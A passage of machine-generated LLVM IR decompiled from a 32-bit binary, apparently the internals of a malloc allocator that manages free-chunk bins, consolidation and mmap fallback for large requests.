  %v2_12ac4 = add i32 %v1_12ac4, 12
  %v3_12ac4 = inttoptr i32 %v2_12ac4 to i32*
  store i32 %v0_12ac4, i32* %v3_12ac4, align 4
  %v0_12ac8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ac8 = add i32 %v0_12ac8, 8
  store i32 %v1_12ac8, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_12ab8, 15
  br i1 %tmp207, label %dec_label_pc_12ae8, label %dec_label_pc_12ad0

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ab8
  %v1_12ad0 = load i32, i32* %r2.global-to-local, align 4
  %v2_12ad0 = add i32 %v1_12ad0, %v0_12ac8
  store i32 %v2_12ad0, i32* %r2.global-to-local, align 4
  %v1_12ad4 = add i32 %v2_12ad0, 4
  %v2_12ad4 = inttoptr i32 %v1_12ad4 to i32*
  %v3_12ad4 = load i32, i32* %v2_12ad4, align 4
  store i32 %v3_12ad4, i32* %r3.global-to-local, align 4
  store i32 %v1_12ac8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12adc.loopexit:                      ; preds = %dec_label_pc_1297c
  %v1_12988 = load i32, i32* @r6, align 4
  %v2_12988 = load i32, i32* @sl, align 4
  %v3_12988 = add i32 %v2_12988, %v1_12988
  store i32 %v3_12988, i32* %r2.global-to-local, align 4
  %v2_1298c = add i32 %v3_12988, 4
  %v3_1298c = inttoptr i32 %v2_1298c to i32*
  %v4_1298c = load i32, i32* %v3_1298c, align 4
  store i32 %v4_1298c, i32* %r3.global-to-local, align 4
  %v2_12990 = add i32 %v1_12988, 8
  store i32 %v2_12990, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %.dec_label_pc_12adc_crit_edge, %dec_label_pc_12adc.loopexit, %dec_label_pc_12ad0
  %v1_12ae0 = phi i32 [ %v4_12c04, %.dec_label_pc_12adc_crit_edge ], [ %v3_12988, %dec_label_pc_12adc.loopexit ], [ %v2_12ad0, %dec_label_pc_12ad0 ]
  %v0_12adc = phi i32 [ %v7_12c04, %.dec_label_pc_12adc_crit_edge ], [ %v4_1298c, %dec_label_pc_12adc.loopexit ], [ %v3_12ad4, %dec_label_pc_12ad0 ]
  %v1_12adc = or i32 %v0_12adc, 1
  store i32 %v1_12adc, i32* %r3.global-to-local, align 4
  %v2_12ae0 = add i32 %v1_12ae0, 4
  %v3_12ae0 = inttoptr i32 %v2_12ae0 to i32*
  store i32 %v1_12adc, i32* %v3_12ae0, align 4
  br label %dec_label_pc_1309c

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ab8
  %v1_12ae8 = load i32, i32* @sl, align 4
  %v2_12ae8 = add i32 %v1_12ae8, %v0_12ac8
  store i32 %v2_12ae8, i32* %r2.global-to-local, align 4
  %v1_12aec = or i32 %v1_12ae8, 1
  store i32 %v1_12aec, i32* %r3.global-to-local, align 4
  %v0_12af0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12af0 = or i32 %v0_12af0, 1
  store i32 %v1_12af0, i32* %r1.global-to-local, align 4
  store i32 %v1_12ac8, i32* %r4.global-to-local, align 4
  %v2_12af8 = add i32 %v0_12ac8, 4
  %v3_12af8 = inttoptr i32 %v2_12af8 to i32*
  store i32 %v1_12aec, i32* %v3_12af8, align 4
  %v0_12afc = load i32, i32* %r2.global-to-local, align 4
  %v1_12afc = load i32, i32* @r6, align 4
  %v2_12afc = add i32 %v1_12afc, 8
  %v3_12afc = inttoptr i32 %v2_12afc to i32*
  store i32 %v0_12afc, i32* %v3_12afc, align 4
  %v0_12b00 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b00 = load i32, i32* @r6, align 4
  %v2_12b00 = add i32 %v1_12b00, 12
  %v3_12b00 = inttoptr i32 %v2_12b00 to i32*
  store i32 %v0_12b00, i32* %v3_12b00, align 4
  %v0_12b04 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b04 = load i32, i32* %r2.global-to-local, align 4
  %v3_12b04 = add i32 %v1_12b04, %v0_12b04
  %v4_12b04 = inttoptr i32 %v3_12b04 to i32*
  store i32 %v0_12b04, i32* %v4_12b04, align 4
  %v0_12b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b08 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b08 = add i32 %v1_12b08, 4
  %v3_12b08 = inttoptr i32 %v2_12b08 to i32*
  store i32 %v0_12b08, i32* %v3_12b08, align 4
  %v0_12b0c = load i32, i32* @r6, align 4
  %v1_12b0c = load i32, i32* %r2.global-to-local, align 4
  %v2_12b0c = add i32 %v1_12b0c, 12
  %v3_12b0c = inttoptr i32 %v2_12b0c to i32*
  store i32 %v0_12b0c, i32* %v3_12b0c, align 4
  %v0_12b10 = load i32, i32* @r6, align 4
  %v1_12b10 = load i32, i32* %r2.global-to-local, align 4
  %v2_12b10 = add i32 %v1_12b10, 8
  %v3_12b10 = inttoptr i32 %v2_12b10 to i32*
  store i32 %v0_12b10, i32* %v3_12b10, align 4
  br label %dec_label_pc_1309c

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12a84, %dec_label_pc_12a74
  %v1_12aac = phi i32 [ %storemerge.pre, %dec_label_pc_12a74 ], [ %v3_12a90, %dec_label_pc_12a84 ]
  store i32 %v1_12aac, i32* %ip.global-to-local, align 4
  %v9_12b1c = icmp eq i32 %v1_12aac, %v1_12a78
  br i1 %v9_12b1c, label %dec_label_pc_12b24.loopexit, label %dec_label_pc_12a84

dec_label_pc_12b24.loopexit:                      ; preds = %dec_label_pc_12b1c
  br label %dec_label_pc_12b24

dec_label_pc_12b24:                               ; preds = %dec_label_pc_12a6c.dec_label_pc_12b24_crit_edge, %dec_label_pc_12b24.loopexit
  %v4_12b54.pre-phi = phi i32 [ %.pre200, %dec_label_pc_12a6c.dec_label_pc_12b24_crit_edge ], [ %v4_12a74, %dec_label_pc_12b24.loopexit ]
  %v1_12b24 = add i32 %v0_12b24.pre, 1
  store i32 %v1_12b24, i32* %r2.global-to-local, align 4
  %v1_12b28 = urem i32 %v1_12b24, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r0.global-to-local, align 4
  %v6_12b34 = shl i32 1, %v1_12b28
  store i32 %v6_12b34, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12b3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12b3c, i32* %r3.global-to-local, align 4
  %v3_12b40 = udiv i32 %v1_12b24, 32
  store i32 %v3_12b40, i32* @r5, align 4
  %v4_12b44 = mul nuw nsw i32 %v3_12b40, 4
  %v5_12b44 = add i32 %v4_12b3c, %v4_12b44
  store i32 %v5_12b44, i32* %r2.global-to-local, align 4
  %v1_12b48 = add i32 %v5_12b44, 820
  %v2_12b48 = inttoptr i32 %v1_12b48 to i32*
  %v3_12b48 = load i32, i32* %v2_12b48, align 4
  store i32 %v3_12b48, i32* @r4, align 4
  %v1_12b4c = add i32 %v4_12b3c, 52
  store i32 %v1_12b4c, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_12b54 = add i32 %v1_12b4c, %v4_12b54.pre-phi
  store i32 %v5_12b54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b58

dec_label_pc_12b58:                               ; preds = %dec_label_pc_12bc0, %dec_label_pc_12b24
  %v1_12b60 = phi i32 [ %v1_12b60.pre, %dec_label_pc_12bc0 ], [ %v3_12b48, %dec_label_pc_12b24 ]
  %v0_12b60 = phi i32 [ %v0_12b58.pre, %dec_label_pc_12bc0 ], [ %v6_12b34, %dec_label_pc_12b24 ]
  %v1_12b58 = sub i32 1, %v0_12b60
  %v2_12b58 = icmp ult i32 %v0_12b60, 2
  %v1_12b58. = select i1 %v2_12b58, i32 %v1_12b58, i32 0
  store i32 %v1_12b58., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_12b60, %v1_12b60
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_12b58
  %v5_12b64 = or i32 %v1_12b58., 1
  store i32 %v5_12b64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12b70.preheader

bb142:                                            ; preds = %dec_label_pc_12b58
  %v2_12b68 = icmp eq i32 %v1_12b58., 0
  br i1 %v2_12b68, label %.dec_label_pc_12bac.preheader_crit_edge, label %dec_label_pc_12b70.preheader

.dec_label_pc_12bac.preheader_crit_edge:          ; preds = %bb142
  %v0_12ba454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bac.preheader

dec_label_pc_12b70.preheader:                     ; preds = %bb142, %.thread12
  %v0_12b70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b70.preheader, %dec_label_pc_12b7c
  %v0_12b70 = phi i32 [ %v0_12b70.pre, %dec_label_pc_12b70.preheader ], [ %v1_12b70, %dec_label_pc_12b7c ]
  %v1_12b70 = add i32 %v0_12b70, 1
  store i32 %v1_12b70, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_12b70, 2
  br i1 %tmp208, label %dec_label_pc_12c50.loopexit, label %dec_label_pc_12b7c

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12b70
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r3.global-to-local, align 4
  %v1_12b80 = load i32, i32* @r8, align 4
  %v2_12b80 = add i32 %v1_12b80, ptrtoint (i32* @global_var_268d4.582 to i32)
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  %v4_12b80 = load i32, i32* %v3_12b80, align 4
  store i32 %v4_12b80, i32* %r2.global-to-local, align 4
  %v4_12b84 = mul i32 %v1_12b70, 4
  %v5_12b84 = add i32 %v4_12b80, %v4_12b84
  store i32 %v5_12b84, i32* %r3.global-to-local, align 4
  %v1_12b88 = add i32 %v5_12b84, 820
  %v2_12b88 = inttoptr i32 %v1_12b88 to i32*
  %v3_12b88 = load i32, i32* %v2_12b88, align 4
  store i32 %v3_12b88, i32* @r4, align 4
  %v2_12b8c = icmp eq i32 %v3_12b88, 0
  br i1 %v2_12b8c, label %dec_label_pc_12b70, label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b7c
  %v4_12b94 = mul i32 %v1_12b70, 256
  %v5_12b94 = add i32 %v4_12b80, %v4_12b94
  store i32 %v5_12b94, i32* %r3.global-to-local, align 4
  %v1_12b98 = add i32 %v5_12b94, 44
  store i32 %v1_12b98, i32* %r0.global-to-local, align 4
  %v0_12b9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12b9c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12bac.preheader

dec_label_pc_12bac.preheader:                     ; preds = %.dec_label_pc_12bac.preheader_crit_edge, %dec_label_pc_12b94
  %v0_12ba454 = phi i32 [ %v1_12b98, %dec_label_pc_12b94 ], [ %v0_12ba454.pre, %.dec_label_pc_12bac.preheader_crit_edge ]
  %v0_12bc8 = phi i32 [ %v3_12b88, %dec_label_pc_12b94 ], [ %v1_12b60, %.dec_label_pc_12bac.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12b9c, %dec_label_pc_12b94 ], [ %v0_12b60, %.dec_label_pc_12bac.preheader_crit_edge ]
  %v2_12bac51 = and i32 %ip.promoted, %v0_12bc8
  %v4_12bac53 = icmp eq i32 %v2_12bac51, 0
  br i1 %v4_12bac53, label %dec_label_pc_12ba4, label %dec_label_pc_12bb4

dec_label_pc_12ba4:                               ; preds = %dec_label_pc_12bac.preheader, %dec_label_pc_12ba4
  %v2_12ba856 = phi i32 [ %v2_12ba8, %dec_label_pc_12ba4 ], [ %ip.promoted, %dec_label_pc_12bac.preheader ]
  %v0_12ba455 = phi i32 [ %v1_12ba4, %dec_label_pc_12ba4 ], [ %v0_12ba454, %dec_label_pc_12bac.preheader ]
  %v1_12ba4 = add i32 %v0_12ba455, 8
  %v2_12ba8 = mul i32 %v2_12ba856, 2
  %v2_12bac = and i32 %v2_12ba8, %v0_12bc8
  %v4_12bac = icmp eq i32 %v2_12bac, 0
  br i1 %v4_12bac, label %dec_label_pc_12ba4, label %dec_label_pc_12bac.dec_label_pc_12bb4_crit_edge

dec_label_pc_12bac.dec_label_pc_12bb4_crit_edge:  ; preds = %dec_label_pc_12ba4
  store i32 %v1_12ba4, i32* %r0.global-to-local, align 4
  store i32 %v2_12ba8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12bac.dec_label_pc_12bb4_crit_edge, %dec_label_pc_12bac.preheader
  %v0_12bd4 = phi i32 [ %v2_12ba8, %dec_label_pc_12bac.dec_label_pc_12bb4_crit_edge ], [ %ip.promoted, %dec_label_pc_12bac.preheader ]
  %v0_12bf8 = phi i32 [ %v1_12ba4, %dec_label_pc_12bac.dec_label_pc_12bb4_crit_edge ], [ %v0_12ba454, %dec_label_pc_12bac.preheader ]
  %v1_12bb4 = add i32 %v0_12bf8, 12
  %v2_12bb4 = inttoptr i32 %v1_12bb4 to i32*
  %v3_12bb4 = load i32, i32* %v2_12bb4, align 4
  store i32 %v3_12bb4, i32* @lr, align 4
  %v9_12bb8 = icmp eq i32 %v3_12bb4, %v0_12bf8
  br i1 %v9_12bb8, label %dec_label_pc_12bc0, label %dec_label_pc_12be0

dec_label_pc_12bc0:                               ; preds = %dec_label_pc_12bb4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r0.global-to-local, align 4
  %v1_12bc4 = load i32, i32* @r8, align 4
  %v2_12bc4 = add i32 %v1_12bc4, ptrtoint (i32* @global_var_268d4.582 to i32)
  %v3_12bc4 = inttoptr i32 %v2_12bc4 to i32*
  %v4_12bc4 = load i32, i32* %v3_12bc4, align 4
  %v2_12bc8 = sub i32 -1, %v0_12bd4
  %v3_12bc8 = and i32 %v0_12bc8, %v2_12bc8
  store i32 %v3_12bc8, i32* @r4, align 4
  %v1_12bcc = load i32, i32* @r5, align 4
  %v4_12bcc = mul i32 %v1_12bcc, 4
  %v5_12bcc = add i32 %v4_12bcc, %v4_12bc4
  store i32 %v5_12bcc, i32* %r3.global-to-local, align 4
  %v1_12bd0 = add i32 %v0_12bf8, 8
  store i32 %v1_12bd0, i32* %r0.global-to-local, align 4
  %v2_12bd4 = mul i32 %v0_12bd4, 2
  store i32 %v2_12bd4, i32* %ip.global-to-local, align 4
  %v2_12bd8 = add i32 %v5_12bcc, 820
  %v3_12bd8 = inttoptr i32 %v2_12bd8 to i32*
  store i32 %v3_12bc8, i32* %v3_12bd8, align 4
  %v0_12b58.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12b60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b58

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bb4
  %v1_12be0 = add i32 %v3_12bb4, 4
  %v2_12be0 = inttoptr i32 %v1_12be0 to i32*
  %v3_12be0 = load i32, i32* %v2_12be0, align 4
  store i32 %v3_12be0, i32* %r3.global-to-local, align 4
  %v1_12be4 = and i32 %v3_12be0, -4
  store i32 %v1_12be4, i32* %r2.global-to-local, align 4
  %v0_12be8 = load i32, i32* @sl, align 4
  %v2_12be8 = sub i32 %v1_12be4, %v0_12be8
  store i32 %v2_12be8, i32* %ip.global-to-local, align 4
  %v1_12bec = add i32 %v3_12bb4, 12
  %v2_12bec = inttoptr i32 %v1_12bec to i32*
  %v3_12bec = load i32, i32* %v2_12bec, align 4
  store i32 %v3_12bec, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_12be8, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_12be0
  %v6_12bf4 = add i32 %v1_12be4, %v3_12bb4
  store i32 %v6_12bf4, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_12be0, %bb143
  %v2_12bf8 = add i32 %v3_12bec, 8
  %v3_12bf8 = inttoptr i32 %v2_12bf8 to i32*
  store i32 %v0_12bf8, i32* %v3_12bf8, align 4
  %v0_12bfc = load i32, i32* %r3.global-to-local, align 4
  %v1_12bfc = load i32, i32* %r0.global-to-local, align 4
  %v2_12bfc = add i32 %v1_12bfc, 12
  %v3_12bfc = inttoptr i32 %v2_12bfc to i32*
  store i32 %v0_12bfc, i32* %v3_12bfc, align 4
  %v4_12c00 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_12adc_crit_edge, label %dec_label_pc_12c0c

.dec_label_pc_12adc_crit_edge:                    ; preds = %bb144
  %v5_12c00 = add i32 %v4_12c00, 8
  store i32 %v5_12c00, i32* %r4.global-to-local, align 4
  %v4_12c04 = load i32, i32* %r2.global-to-local, align 4
  %v5_12c04 = add i32 %v4_12c04, 4
  %v6_12c04 = inttoptr i32 %v5_12c04 to i32*
  %v7_12c04 = load i32, i32* %v6_12c04, align 4
  store i32 %v7_12c04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12adc

dec_label_pc_12c0c:                               ; preds = %bb144
  %v1_12c0c = load i32, i32* @sl, align 4
  %v2_12c0c = add i32 %v1_12c0c, %v4_12c00
  store i32 %v2_12c0c, i32* %r1.global-to-local, align 4
  %v1_12c14 = load i32, i32* @r6, align 4
  %v2_12c14 = add i32 %v1_12c14, 8
  %v3_12c14 = inttoptr i32 %v2_12c14 to i32*
  store i32 %v2_12c0c, i32* %v3_12c14, align 4
  %v0_12c18 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c18 = load i32, i32* @r6, align 4
  %v2_12c18 = add i32 %v1_12c18, 12
  %v3_12c18 = inttoptr i32 %v2_12c18 to i32*
  store i32 %v0_12c18, i32* %v3_12c18, align 4
  %v0_12c1c = load i32, i32* @r6, align 4
  %v1_12c1c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c1c = add i32 %v1_12c1c, 8
  %v3_12c1c = inttoptr i32 %v2_12c1c to i32*
  store i32 %v0_12c1c, i32* %v3_12c1c, align 4
  %v0_12c20 = load i32, i32* @r6, align 4
  %v1_12c20 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c20 = add i32 %v1_12c20, 12
  %v3_12c20 = inttoptr i32 %v2_12c20 to i32*
  store i32 %v0_12c20, i32* %v3_12c20, align 4
  %tmp210 = icmp ult i32 %v1_12c0c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_12c0c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v8_12c2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v8_12c2c, i32* %r3.global-to-local, align 4
  %v4_12c30 = load i32, i32* %r1.global-to-local, align 4
  %v6_12c30 = add i32 %v8_12c2c, 48
  %v7_12c30 = inttoptr i32 %v6_12c30 to i32*
  store i32 %v4_12c30, i32* %v7_12c30, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_12c0c, %bb145
  %v0_12c34 = load i32, i32* @sl, align 4
  %v1_12c34 = or i32 %v0_12c34, 1
  store i32 %v1_12c34, i32* %r2.global-to-local, align 4
  %v0_12c38 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c38 = or i32 %v0_12c38, 1
  store i32 %v1_12c38, i32* %r3.global-to-local, align 4
  %v0_12c3c = load i32, i32* @lr, align 4
  %v1_12c3c = add i32 %v0_12c3c, 8
  store i32 %v1_12c3c, i32* %r4.global-to-local, align 4
  %v2_12c40 = add i32 %v0_12c3c, 4
  %v3_12c40 = inttoptr i32 %v2_12c40 to i32*
  store i32 %v1_12c34, i32* %v3_12c40, align 4
  %v0_12c44 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c44 = load i32, i32* %r1.global-to-local, align 4
  %v3_12c44 = add i32 %v1_12c44, %v0_12c44
  %v4_12c44 = inttoptr i32 %v3_12c44 to i32*
  store i32 %v0_12c44, i32* %v4_12c44, align 4
  %v0_12c48 = load i32, i32* %r3.global-to-local, align 4
  %v1_12c48 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c48 = add i32 %v1_12c48, 4
  %v3_12c48 = inttoptr i32 %v2_12c48 to i32*
  store i32 %v0_12c48, i32* %v3_12c48, align 4
  br label %dec_label_pc_1309c

dec_label_pc_12c50.loopexit:                      ; preds = %dec_label_pc_12b70
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12c50.loopexit, %dec_label_pc_12864, %dec_label_pc_1286c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %ip.global-to-local, align 4
  %v4_12c58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12c58, i32* @r0, align 4
  %v1_12c5c = add i32 %v4_12c58, 44
  %v2_12c5c = inttoptr i32 %v1_12c5c to i32*
  %v3_12c5c = load i32, i32* %v2_12c5c, align 4
  store i32 %v3_12c5c, i32* %ip.global-to-local, align 4
  %v1_12c60 = add i32 %v3_12c5c, 4
  %v2_12c60 = inttoptr i32 %v1_12c60 to i32*
  %v3_12c60 = load i32, i32* %v2_12c60, align 4
  %v0_12c64 = load i32, i32* @sl, align 4
  %v1_12c64 = add i32 %v0_12c64, 16
  store i32 %v1_12c64, i32* %r1.global-to-local, align 4
  %v1_12c68 = and i32 %v3_12c60, -4
  store i32 %v1_12c68, i32* %r3.global-to-local, align 4
  %v3_12c6c = icmp ult i32 %v1_12c68, %v1_12c64
  br i1 %v3_12c6c, label %dec_label_pc_12c9c, label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c50
  %v2_12c78 = sub i32 %v1_12c68, %v0_12c64
  %v2_12c7c = add i32 %v0_12c64, %v3_12c5c
  store i32 %v2_12c7c, i32* %r1.global-to-local, align 4
  %v1_12c80 = or i32 %v2_12c78, 1
  store i32 %v1_12c80, i32* %r3.global-to-local, align 4
  %v1_12c84 = or i32 %v0_12c64, 1
  store i32 %v1_12c84, i32* %r2.global-to-local, align 4
  %v1_12c88 = add i32 %v3_12c5c, 8
  store i32 %v1_12c88, i32* %r4.global-to-local, align 4
  store i32 %v1_12c84, i32* %v2_12c60, align 4
  %v0_12c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c90 = load i32, i32* @r0, align 4
  %v2_12c90 = add i32 %v1_12c90, 44
  %v3_12c90 = inttoptr i32 %v2_12c90 to i32*
  store i32 %v0_12c90, i32* %v3_12c90, align 4
  %v0_12c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_12c94 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c94 = add i32 %v1_12c94, 4
  %v3_12c94 = inttoptr i32 %v2_12c94 to i32*
  store i32 %v0_12c94, i32* %v3_12c94, align 4
  br label %dec_label_pc_1309c

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c50
  %v1_12c9c = inttoptr i32 %v4_12c58 to i32*
  %v2_12c9c = load i32, i32* %v1_12c9c, align 4
  store i32 %v2_12c9c, i32* %r3.global-to-local, align 4
  %v1_12ca0 = and i32 %v2_12c9c, 2
  store i32 %v1_12ca0, i32* %ip.global-to-local, align 4
  %v2_12ca0 = icmp eq i32 %v1_12ca0, 0
  %v1_12ca4 = add i32 %v4_12c58, 860
  %v2_12ca4 = inttoptr i32 %v1_12ca4 to i32*
  %v3_12ca4 = load i32, i32* %v2_12ca4, align 4
  store i32 %v3_12ca4, i32* %r1.global-to-local, align 4
  br i1 %v2_12ca0, label %dec_label_pc_12cbc, label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c9c
  %v0_12cac = call i32 @__malloc_consolidate()
  %v0_12cb0 = load i32, i32* @sl, align 4
  %v1_12cb0 = add i32 %v0_12cb0, -7
  store i32 %v1_12cb0, i32* %r0.global-to-local, align 4
  %v1_12cb4 = call i32 @malloc(i32 %v1_12cb0)
  store i32 %v1_12cb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13098

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c9c
  %v1_12cbc = add i32 %v4_12c58, 844
  %v2_12cbc = inttoptr i32 %v1_12cbc to i32*
  %v3_12cbc = load i32, i32* %v2_12cbc, align 4
  store i32 %v3_12cbc, i32* %r3.global-to-local, align 4
  %v3_12cc0 = icmp ult i32 %v0_12c64, %v3_12cbc
  %v1_12cc4 = add i32 %v3_12ca4, -1
  store i32 %v1_12cc4, i32* %sb.global-to-local, align 4
  br i1 %v3_12cc0, label %dec_label_pc_12d98, label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cbc
  %v1_12ccc = add i32 %v4_12c58, 852
  %v2_12ccc = inttoptr i32 %v1_12ccc to i32*
  %v3_12ccc = load i32, i32* %v2_12ccc, align 4
  store i32 %v3_12ccc, i32* %r2.global-to-local, align 4
  %v1_12cd0 = add i32 %v4_12c58, 848
  %v2_12cd0 = inttoptr i32 %v1_12cd0 to i32*
  %v3_12cd0 = load i32, i32* %v2_12cd0, align 4
  store i32 %v3_12cd0, i32* %r3.global-to-local, align 4
  %v6_12cd8 = icmp slt i32 %v3_12cd0, %v3_12ccc
  br i1 %v6_12cd8, label %dec_label_pc_12cdc, label %dec_label_pc_12d98

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12ccc
  %v1_12cdc = add i32 %v0_12c64, 10
  %v2_12ce0 = add i32 %v1_12cdc, %v3_12ca4
  store i32 %v2_12ce0, i32* %r3.global-to-local, align 4
  %v2_12ce4 = sub i32 0, %v3_12ca4
  %v3_12ce4 = and i32 %v2_12ce0, %v2_12ce4
  store i32 %v3_12ce4, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_12ce4, %v0_12c64
  br i1 %tmp211, label %dec_label_pc_12cf0, label %dec_label_pc_12d98

dec_label_pc_12cf0:                               ; preds = %dec_label_pc_12cdc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12ce4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12d08 = call i32 @mmap(i32 0, i32 %v3_12ce4, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12d08, i32* %r0.global-to-local, align 4
  %v7_12d0c = icmp eq i32 %v6_12d08, -1
  br i1 %v7_12d0c, label %dec_label_pc_12cf0.dec_label_pc_12d98_crit_edge, label %dec_label_pc_12d14

dec_label_pc_12cf0.dec_label_pc_12d98_crit_edge:  ; preds = %dec_label_pc_12cf0
  %v1_12dbc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12d98

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12cf0
  %v1_12d14 = urem i32 %v6_12d08, 8
  store i32 %v1_12d14, i32* %r2.global-to-local, align 4
  %v2_12d14 = icmp eq i32 %v1_12d14, 0
  br i1 %v2_12d14, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_12d14
  %v2_12d18 = sub nsw i32 8, %v1_12d14
  store i32 %v2_12d18, i32* %r3.global-to-local, align 4
  %v2_12d1c = load i32, i32* @r4, align 4
  %v3_12d1c = sub i32 %v2_12d1c, %v2_12d18
  %v3_12d20 = add i32 %v2_12d18, %v6_12d08
  store i32 %v3_12d20, i32* %lr.global-to-local, align 4
  %v2_12d28 = or i32 %v3_12d1c, 2
  store i32 %v2_12d28, i32* %r2.global-to-local, align 4
  %v5_12d30 = inttoptr i32 %v3_12d20 to i32*
  store i32 %v2_12d18, i32* %v5_12d30, align 4
  %v1_12d34 = load i32, i32* %r2.global-to-local, align 4
  %v2_12d34 = load i32, i32* %lr.global-to-local, align 4
  %v3_12d34 = add i32 %v2_12d34, 4
  %v4_12d34 = inttoptr i32 %v3_12d34 to i32*
  store i32 %v1_12d34, i32* %v4_12d34, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_12d14
  store i32 %v6_12d08, i32* %lr.global-to-local, align 4
  %v1_12d2c47 = load i32, i32* @r4, align 4
  %v2_12d2c48 = or i32 %v1_12d2c47, 2
  store i32 %v2_12d2c48, i32* %r3.global-to-local, align 4
  %v3_12d38 = inttoptr i32 %v6_12d08 to i32*
  store i32 0, i32* %v3_12d38, align 4
  %v1_12d3c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d3c = load i32, i32* %lr.global-to-local, align 4
  %v3_12d3c = add i32 %v2_12d3c, 4
  %v4_12d3c = inttoptr i32 %v3_12d3c to i32*
  store i32 %v1_12d3c, i32* %v4_12d3c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12d48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_12d48, i32* %ip.global-to-local, align 4
  %v1_12d4c = add i32 %v4_12d48, 848
  %v2_12d4c = inttoptr i32 %v1_12d4c to i32*
  %v3_12d4c = load i32, i32* %v2_12d4c, align 4
  store i32 %v3_12d4c, i32* %r3.global-to-local, align 4
  %v1_12d50 = add i32 %v4_12d48, 856
  %v2_12d50 = inttoptr i32 %v1_12d50 to i32*
  %v3_12d50 = load i32, i32* %v2_12d50, align 4
